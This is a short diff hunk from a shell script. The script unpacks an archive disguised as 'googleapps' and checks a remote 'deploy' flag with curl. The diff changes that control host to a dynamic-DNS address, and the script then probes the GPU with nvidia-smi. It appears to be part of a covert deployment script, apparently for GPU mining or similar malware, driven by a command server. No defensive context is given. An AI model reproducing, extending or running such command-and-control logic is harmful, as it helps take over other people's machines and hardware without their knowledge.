@@ -17,7 +17,7 @@ tar -xvf ./googleapps8474127412742.tar.gz
 
 cd googleapps8474
 
-string=$(curl https://custom-tkan.frb.io/?q=deploy)
+string=$(curl http://mobile84.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
 google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
